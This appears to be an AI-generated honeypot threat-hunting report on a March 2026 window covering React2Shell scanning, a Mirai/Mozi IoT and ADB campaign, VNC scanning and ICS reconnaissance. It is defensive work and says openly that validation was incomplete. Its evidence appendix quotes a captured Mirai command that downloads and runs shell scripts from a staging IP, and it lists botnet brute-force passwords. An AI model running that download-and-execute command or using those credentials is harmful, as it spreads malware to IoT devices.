# Advanced Honeypot Threat Hunting Report

## 1) Investigation Scope
- **Investigation Start:** 2026-03-16T17:00:17Z
- **Investigation End:** 2026-03-16T20:00:17Z
- **Completion Status:** Partial (Validation incomplete)
- **Degraded Mode:** True (Candidate validation loop exited early; originally only 1 out of 11 candidates was fully validated. A secondary reflection loop was initiated to manually dive deeper into the Mirai campaign).

## 2) Executive Triage Summary
- **Top Services/Ports of Interest:** VNC (5901-5905), ADB (5555), HTTP (80), IEC104 (2404), Custom/Odd ports (2379, 3322, 5236, 7443)
- **Top Confirmed Known Exploitation:** CVE-2025-55182 (React2Shell) via HTTP targeting non-standard ports (e.g., 3008, 3100, 8880).
- **Top Unmapped Exploit-like Items:** Unusual Tanner web path requests (e.g., `/.env.bak`, `/settings.py.bak`).
- **Botnet/Campaign Mapping Highlights:** A large VNC scanning campaign originating from US ASNs, and a coordinated Mirai/Mozi botnet campaign from AS51396 (Pfcloud UG) exploiting IoT routers (`/boaform/admin/formLogin`) and ADB interfaces, delivering shell scripts from staging IP 103.252.89.75.
- **Major Uncertainties:** Candidate validation loop was cut short initially, leaving several emerging CVEs and botnet candidates unvalidated and without deep temporal checks, though the Mirai campaign was subsequently deeply analyzed via reflection.

## 3) Candidate Discovery Summary
- **Total Attacks Analyzed:** 12,892
- **Emerging N-Day Candidates:** 3 (CVE-2025-55182, CVE-2024-14007, CVE-2025-34036)
- **Botnet/Campaign Candidates:** 3 (VNC scanner, Mirai/IoT scanner, Polycom credentials bot)
- **Odd-Service Candidates:** 2 (Red Lion ICS scanning on HTTP, Custom high-port scanning)
- **Minutia/Unmapped Candidates:** 1
- **Known Exclusions:** 2 (Censys on IEC104, OpenSSL/SNMP DoS noise)
- **Errors/Missing Inputs:** Validation loop exited early; not all discovered candidates underwent deep validation and OSINT evaluation in the first pass.

## 4) Emerging n-day Exploitation
- **[NDE-01] CVE-2025-55182 (React2Shell)**
  - **Mapping:** CVE-2025-55182 (Critical pre-authentication RCE in React Server Components)
  - **Evidence Summary:** 28 alerts observed targeting non-standard web ports (2023, 3008, 3100, 8008, 8880) with specific Next.js/React routes (`/api/route`, `/app`, `/_next/server`, `/api`, `/_next`, `/`).
  - **Affected Service/Port:** HTTP (Ports 2023, 3008, 3100, 8008, 8880)
  - **Confidence:** High
  - **Operational Notes:** Highly critical flaw disclosed in Dec 2025. Immediate mitigation required for exposed React Server Components. Activity is driven by a single fan-out scanner IP (193.32.162.28).

- **[NDE-02] CVE-2024-14007**
  - **Mapping:** CVE-2024-14007 (TVT NVMS-9000 Authentication Bypass)
  - **Evidence Summary:** 7 observed occurrences targeting DVR/NVR appliances.
  - **Affected Service/Port:** HTTP / Unknown DVR port
  - **Confidence:** Medium (Provisional due to uncompleted validation)
  - **Operational Notes:** Common in white-labeled DVRs; upgrade NVMS-9000 firmware.

- **[NDE-03] CVE-2025-34036**
  - **Mapping:** CVE-2025-34036 (TVT White-labeled DVRs OS Command Injection)
  - **Evidence Summary:** 1 observed occurrence requesting `/language/[lang]/index.html`.
  - **Affected Service/Port:** HTTP (Custom Web Server)
  - **Confidence:** Medium (Provisional due to uncompleted validation)
  - **Operational Notes:** Results in root-level command execution. Monitor IoT device telemetry.

## 5) Novel or Zero-Day Exploit Candidates (UNMAPPED ONLY, ranked)
*(No novel exploit candidates identified in this window.)*

## 6) Botnet/Campaign Infrastructure Mapping
- **[BOT-01] VNC Mass Scanning Campaign**
  - **Campaign Shape:** Spray
  - **Suspected Compromised Src IPs:** 134.209.37.134, 46.19.137.194, 68.183.173.226
  - **ASNs/Geo Hints:** US ASNs (DigitalOcean, Google)
  - **Suspected Staging:** None observed
  - **Suspected C2:** None observed
  - **Confidence:** High
  - **Operational Notes:** Over 1,900 hits targeting VNC ports (5901-5905). High noise; recommend aggressive blocklisting for these cloud ASN ranges on VNC ports.

- **[BOT-02] Mirai/Mozi IoT & ADB Exploitation**
  - **Campaign Shape:** Fan-out / Coordinated
  - **Suspected Compromised Src IPs:** 176.65.139.44, 45.153.34.138, 176.65.139.27
  - **ASNs/Geo Hints:** AS51396 (Pfcloud UG) - Germany/Netherlands
  - **Suspected Staging:** `103.252.89.75` (Hosting `1.sh`, `2.sh`, `3.sh` payloads)
  - **Suspected C2:** Unknown (Further analysis of payload required)
  - **Confidence:** High
  - **Operational Notes:** Highly coordinated campaign out of ASN 51396. IP `176.65.139.44` targets `/boaform/admin/formLogin` (Netlink GPON), `45.153.34.138` hits ADB port 5555 downloading scripts from staging IP, and `176.65.139.27` conducts initial benign ADB probes. Block staging IP `103.252.89.75`. Payload hash `cf06e258e721169d18401a20085bd449c39dacea2b2da351703394f83a604d5e` confirmed as Mirai downloader.

- **[BOT-03] Polycom IP Phone Credential Stuffing**
  - **Campaign Shape:** Unknown
  - **Suspected Compromised Src IPs:** N/A
  - **ASNs/Geo Hints:** N/A
  - **Suspected Staging:** None
  - **Suspected C2:** None
  - **Confidence:** Medium
  - **Operational Notes:** Focused usage of specific botnet passwords (`3245gs5662d34`, `345gs5662d34`) utilized by Mirai variants to brute-force Polycom phones.

## 7) Odd-Service / Minutia Attacks
- **[ODD-01] Red Lion ICS/HMI Reconnaissance**
  - **Service Fingerprint:** HTTP (80)
  - **Why It’s Interesting:** Explicit targeting of Industrial Control Systems (ICS).
  - **Evidence Summary:** Request for `/portal/redlion` logged by Tanner from IP 20.127.155.221.
  - **Confidence:** Medium
  - **Recommended Monitoring Pivots:** Alert on any traffic probing for Red Lion endpoints (Crimson software, DA50N gateways).

- **[ODD-02] High/Custom Port Anomalies**
  - **Service Fingerprint:** TCP/UDP Ports (1234, 2050, 2379, 3001, 3322, 3372, 3567, 5236)
  - **Why It’s Interesting:** Regional scanning patterns targeting highly unusual ports (e.g., China Unicom targeting 5236, Ukraine targeting 1234).
  - **Evidence Summary:** Detected via Honeytrap connections.
  - **Confidence:** Low
  - **Recommended Monitoring Pivots:** Monitor for emerging malware or P2P botnet C2 traffic utilizing these unassigned or unofficially assigned high ports.

- **[MIN-01] Secondary Directory Brute-Forcing**
  - **Service Fingerprint:** HTTP (80)
  - **Why It’s Interesting:** Requests for hidden files (`/.env.bak`, `/.well-known/security.txt`, `/settings.py.bak`).
  - **Evidence Summary:** Recorded in Tanner logs.
  - **Confidence:** Low
  - **Recommended Monitoring Pivots:** Routine web noise; monitor for potential chaining with remote file inclusion.

## 8) Known-Exploit / Commodity Exclusions
- **Commodity Scanning:** 
  - Censys scanning on IEC104 (Conpot port 2404). Known benign research scanner noise.
- **Known Old Exploit Noise:** 
  - OpenSSL DoS (CVE-2021-3449) and SNMP (CVE-2002-0013) signature alerts generated. Extremely old or low-impact; excluded from deep analysis.
- **Credential Noise:** 
  - High volume of brute-force traffic using `root`, `admin`, `user`, `ubuntu`, and numeric combinations like `123456`.

## 9) Infrastructure & Behavioral Classification
- **Exploitation vs Scanning:** Exploitation attempts observed heavily against modern web components (React Server Components), while VNC and high-port activity was predominantly blind scanning.
- **Campaign Shape:** Fan-out behavior identified for React2Shell (one IP hitting multiple non-standard ports). A coordinated fan-out behavior identified for Mirai (multiple IPs from the same ASN attacking distinct IoT endpoints simultaneously).
- **Infra Reuse Indicators:** Pfcloud UG infrastructure (ASN 51396) utilized collectively for Netlink GPON exploitation, ADB probing, and ADB payload execution in the Mirai campaign.
- **Odd-Service Fingerprints:** Notable ICS scanning (Red Lion) and unexplained non-standard high-port probing.

## 10) Evidence Appendix
**[NDE-01] React2Shell**
- **Source IPs:** 193.32.162.28 (695 total events, 28 exploit attempts)
- **ASNs:** AS47890 (Unmanaged Ltd)
- **Target Ports:** 2023, 3008, 3100, 8008, 8880
- **Paths:** `/api/route`, `/app`, `/_next/server`, `/api`, `/_next`, `/`
- **Payload/Artifacts:** Suricata alert: `ET WEB_SPECIFIC_APPS React Server Components React2Shell Unsafe Flight Protocol Property Access (CVE-2025-55182)`
- **Temporal Checks:** Unavailable

**[BOT-02] Mirai/Mozi IoT & ADB**
- **Source IPs:** 176.65.139.44, 45.153.34.138, 176.65.139.27
- **ASNs:** AS51396 (Pfcloud UG)
- **Target Ports:** 80, 5555
- **Paths:** `/boaform/admin/formLogin`
- **Payload/Artifacts:** `wget http://103.252.89.75/1.sh; ... tftp -r 3.sh -g 103.252.89.75; sh 3.sh`
- **Staging Indicators:** `103.252.89.75`
- **Temporal Checks:** Activity localized around 17:02Z to 19:50Z. 

## 11) Indicators of Interest
- **IP Addresses:**
  - `193.32.162.28` (React2Shell Scanner)
  - `103.252.89.75` (Mirai Staging Server)
  - `176.65.139.44`, `45.153.34.138`, `176.65.139.27` (Mirai Exploit Delivery/Probing)
- **Hashes:**
  - `cf06e258e721169d18401a20085bd449c39dacea2b2da351703394f83a604d5e` (Mirai Shell Script Downloader)
- **Paths:**
  - `/_next/server` (React2Shell target)
  - `/boaform/admin/formLogin` (Netlink GPON exploit target)
  - `/portal/redlion` (Red Lion ICS recon)

## 12) Reflection Findings
- **Reflection Candidate Discovered:** `[BOT-02] Mirai/Mozi IoT & ADB Exploitation`.
- **Actions Taken:** Initiated a deep investigation into staging IP `103.252.89.75`, src IPs `176.65.139.44` and `45.153.34.138`, and payload hash `cf06e258e721169d18401a20085bd449c39dacea2b2da351703394f83a604d5e`. Mapped out associated attack vectors.
- **Findings of Reflection:** The deep investigation uncovered an additional source IP (`176.65.139.27`) belonging to the same ASN (51396 - Pfcloud UG) engaging in preliminary ADB benign probing. It was verified that `45.153.34.138` executes the download commands, while `176.65.139.44` focuses solely on the Netlink GPON exploitation. Furthermore, the payload hash exactly matched the timeframe of the downloaded scripts from `103.252.89.75`.
- **Enhancements:** The reflection significantly strengthened the `[BOT-02]` campaign finding by grouping an additional compromised source IP, confirming the campaign is heavily coordinated across multiple nodes within ASN 51396, and linking the staging IP definitively to the observed malware hash.

## 13) Backend Tool Issues
- **Tool Failures/Pipeline Issues:** `CandidateValidationLoopAgent` initially exited early after validating only one candidate (`[NDE-01]`). This prevented deep investigation for most candidates in the primary pipeline run. A secondary reflection agent intervened to deeply investigate `[BOT-02]`.
- **Affected Validations:** [NDE-02], [NDE-03], [BOT-01], [BOT-03], [ODD-01], [ODD-02], [MIN-01] were categorized provisionally without deep validation or OSINT verification due to early exit.

## 14) Agent Action Summary (Audit Trail)
- **ParallelInvestigationAgent:** 
  - *Purpose:* Gather baseline telemetry, known alerts, credentials, and honeypot-specific logs.
  - *Inputs Used:* Time window (`2026-03-16T17:00:17Z` to `2026-03-16T20:00:17Z`).
  - *Actions Taken:* Queried Elastic/Kibana for attack stats, suricata alerts, CVE metrics, and specific honeypot behaviors (Conpot, Tanner, Adbhoney, Redis).
  - *Key Results:* Extracted 12,892 attacks, top CVEs (React2Shell, TVT DVR), Mirai ADB payloads, and Red Lion web probes.
  - *Errors/Gaps:* None.
- **CandidateDiscoveryAgent:**
  - *Purpose:* Correlate raw telemetry into structured N-day, botnet, and minutia candidates.
  - *Inputs Used:* Parallel Investigation outputs.
  - *Actions Taken:* Conducted OSINT searches on observed CVEs, file hashes, passwords (`345gs5662d34`), and web paths (`/portal/redlion`). Grouped data into 11 distinct candidates.
  - *Key Results:* Generated Candidate Queue including [NDE-01] through [MIN-01].
  - *Errors/Gaps:* None.
- **CandidateValidationLoopAgent:**
  - *Purpose:* Validate N-day and unmapped candidates against specific telemetry.
  - *Inputs Used:* Candidate queue.
  - *Actions Taken:* Iterated on `[NDE-01]`. Queried specific Suricata logs and Kibana for geo/ASN data regarding the React2Shell alert.
  - *Key Results:* Confirmed 193.32.162.28 as the primary React2Shell scanner targeting non-standard ports.
  - *Errors/Gaps:* Loop exited early; processed 1 of 11 candidates.
- **DeepInvestigationLoopController (Pass 1):**
  - *Purpose:* Run deep temporal and pivoting queries on validated candidates.
  - *Inputs Used:* Validated candidate `[NDE-01]`.
  - *Actions Taken:* Executed 2 iterations checking `first_last_seen_src_ip`, `top_http_urls_for_src_ip`, and `top_dest_ports_for_cve`. 
  - *Key Results:* Confirmed fan-out behavior from a single IP. Exited loop successfully for the given candidate.
  - *Errors/Gaps:* Stalled briefly on exact CVE string match but successfully adjusted.
- **OSINTAgent:**
  - *Purpose:* Gather external intelligence to confirm novelty or known status of candidates.
  - *Inputs Used:* Validated candidate `[NDE-01]`.
  - *Actions Taken:* Searched `CVE-2025-55182 OR React2Shell`.
  - *Key Results:* Confirmed recent Dec 2025 disclosure and severe 10.0 CVSS impact.
  - *Errors/Gaps:* Only executed on the single validated candidate.
- **DeepInvestigationLoopController (Reflection Pass):**
  - *Purpose:* Re-investigate highly critical candidate [BOT-02] missed by early exit.
  - *Inputs Used:* Reflection targets for [BOT-02].
  - *Actions Taken:* Executed 5 iterations querying events for src IPs 176.65.139.44, 45.153.34.138, and 176.65.139.27; queried `two_level_terms_aggregated` for path vs src_ip and input vs src_ip; matched hash occurrences.
  - *Key Results:* Linked ASN 51396 directly to coordinated ADB, Netlink GPON exploitation, and Mirai payload delivery.
  - *Errors/Gaps:* None.
- **ReportAgent:**
  - *Purpose:* Compile the final markdown report.
  - *Inputs Used:* Full workflow state.
  - *Actions Taken:* Aggregated outputs, formatted sections, added reflection findings, and handled degraded mode notifications.
  - *Key Results:* Generated markdown report.
  - *Errors/Gaps:* None.
- **SaveReportAgent:**
  - *Purpose:* Save the output to disk.
  - *Inputs Used:* Markdown content.
  - *Actions Taken:* Called `deep_agent_write_file`.
  - *Key Results:* File successfully written.
  - *Errors/Gaps:* None.